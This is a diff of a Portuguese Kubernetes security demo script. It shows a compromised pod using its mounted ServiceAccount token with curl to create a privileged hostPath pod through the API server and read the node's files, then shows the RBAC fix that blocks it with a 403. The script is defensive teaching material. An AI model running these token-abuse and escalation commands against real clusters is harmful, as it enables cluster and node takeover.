@@ -1,56 +1,88 @@
-# Cavaleiro 2 — Executar (Privileged Containers)
+# Cavaleiro 2 — Executar (Privilege Escalation via RBAC)
 
-> "Privileged é sudo sem supervisão."
-> Um container privilegiado é só um host esperando para acontecer.
+> "Não precisa de root no host. Precisa do token certo."
+> Você não escreveu `privileged`. O RBAC deixou o atacante escrever.
 
-**Ataque:** com `privileged` + `hostPath`, o container deixa de ser uma caixa isolada e vira o próprio node.
-**Defesa:** Pod Security Standards no nível `restricted` — nativo do Kubernetes, sem instalar nada.
+**Ataque:** o atacante já tem um shell num pod comprometido. Ele **não** precisa do seu kubectl
+nem de acesso externo: todo pod já vem com o token da ServiceAccount montado em
+`/var/run/secrets/...` **e** alcança o API server pelo DNS interno `https://kubernetes.default.svc`.
+Um `curl` basta. Se a SA puder `create pods` (parece inofensivo), ele cria o pod privilegiado dele.
+
+**Defesa:** least privilege no RBAC — tirar o `create` que o app não precisava.
+
+> Por que não `privileged` + PSS? Porque `privileged` é exceção, e no 1.36 user namespaces já tira
+> o "root do container = root do host". O que derruba cluster hoje é **permissão demais** — e isso
+> o user namespaces não resolve.
 
 ---
 
 ## Roteiro
 
-### 1. Sobe um container privilegiado que monta o filesystem do node
-```bash
-kubectl apply -f privileged-pod.yaml
-kubectl -n c2-privileged get pod fuga-do-container
-```
-*Fala:* "Esse pod pediu `privileged: true` e montou o disco do node em `/host`. O cluster não reclamou."
+Tudo roda **de dentro do pod comprometido** (via `kubectl exec`), usando só o token montado.
 
-### 2. Lê arquivos do host de dentro do container
+### 1. O cenário: um app que pode "create pods"
 ```bash
-kubectl -n c2-privileged exec fuga-do-container -- cat /host/etc/os-release
-kubectl -n c2-privileged exec fuga-do-container -- ls /host/var/lib/kubelet
+kubectl apply -f cenario.yaml
 ```
-*Resultado esperado:* você lê arquivos que pertencem ao **node**, não ao container.
-*Fala:* "Se o atacante consegue virar root no host, Kubernetes vira detalhe. O problema não é o container escapar — é você abrir a porta."
+Uma SA com permissão de criar pods ("o app orquestra workers") — parece inofensivo.
 
-### 3. A defesa: Pod Security Standards (restricted)
+### 2. De dentro do pod, o token já fala com a API interna
 ```bash
-kubectl delete -f privileged-pod.yaml
-kubectl apply -f pss-enforce.yaml
+kubectl -n c2-privileged exec app-comprometido -- sh -c \
+  'curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
+   https://kubernetes.default.svc/version'
 ```
-Isso rotula o namespace para **exigir** o padrão `restricted` (sem privileged, sem hostPath, sem rodar como root).
+*Resultado esperado:* a API responde. Sem kubectl externo, sem seu kubeconfig.
+*Fala:* "O atacante não invade o API server de fora. Ele já está dentro do pod — e o pod nasceu com a credencial e a rota para a API."
 
-### 4. Tenta subir o pod privilegiado de novo → rejeitado
+### 3. Escalada: criar o pod privilegiado via API (POST)
 ```bash
-kubectl apply -f privileged-pod.yaml
+kubectl -n c2-privileged exec -i app-comprometido -- sh -c \
+  'curl -sk -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
+   -H "Content-Type: application/yaml" \
+   https://kubernetes.default.svc/api/v1/namespaces/c2-privileged/pods --data-binary @-' \
+  < pod-privilegiado.yaml
 ```
-*Resultado esperado:* **`violates PodSecurity "restricted:latest"`** — o pod é recusado na criação.
-*Fala:* "Containers não deveriam administrar servidores. Com PSS, o cluster passa a recusar quem pede demais."
+*Resultado esperado:* a API responde `201` (criado).
+*Fala:* "Você nunca escreveu `privileged: true`. Não precisou — bastou a SA poder criar pods."
+
+### 4. Prova: o pod do atacante lê o node
+```bash
+kubectl -n c2-privileged exec pod-do-atacante -- cat /host/etc/os-release
+```
+*Resultado esperado:* sai o sistema do **node** (não do container). O host está exposto.
+
+### 5. A defesa: RBAC sem `create`
+```bash
+kubectl apply -f defesa.yaml
+```
+Reaplica o mesmo Role, agora só com `get`/`list`. O token continua válido, mas sem o poder perigoso.
+
+### 6. O mesmo ataque, agora negado
+```bash
+kubectl -n c2-privileged exec -i app-comprometido -- sh -c \
+  'curl -sk -o /dev/null -w "%{http_code}\n" -X POST \
+   -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
+   -H "Content-Type: application/yaml" \
+   https://kubernetes.default.svc/api/v1/namespaces/c2-privileged/pods --data-binary @-' \
+  < pod-privilegiado.yaml
+```
+*Resultado esperado:* `403`. Mesmo token, mesma chamada — agora **Forbidden**.
 
 ---
 
 ## Reset
 ```bash
-kubectl delete -f privileged-pod.yaml --ignore-not-found
-kubectl label namespace c2-privileged \
-  pod-security.kubernetes.io/enforce- \
-  pod-security.kubernetes.io/warn- \
-  pod-security.kubernetes.io/audit- \
-  pod-security.kubernetes.io/enforce-version- 2>/dev/null || true
+kubectl delete -f pod-privilegiado.yaml -f cenario.yaml --ignore-not-found
 ```
 
 ## Notas
-- `restricted` é o nível mais rígido dos [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/). Os outros são `baseline` (bloqueia os abusos mais óbvios) e `privileged` (sem restrição).
-- PSS atua por **namespace**, via labels. Comece com `warn`/`audit` para medir o impacto antes de mudar para `enforce`.
+- **`automountServiceAccountToken: false`** no pod (ou na SA) fecha o vetor inteiro quando o app não
+  fala com a API — sem token montado, não há o que roubar.
+- **PSS / Kyverno** continuam valendo como rede de segurança: barram o pod privilegiado mesmo que o
+  RBAC falhe. Defesa em profundidade.
+- **user namespaces** (`hostUsers: false`, GA no 1.36) neutralizam o escape de kernel, mas não o
+  abuso de RBAC — são camadas diferentes.
+- Audite RBAC com `kubectl auth can-i --list`, [rakkess](https://github.com/corneliusweig/rakkess)
+  ou [kubectl-who-can](https://github.com/aquasecurity/kubectl-who-can): procure curingas e quem
+  pode `create pods` / ler `secrets`.
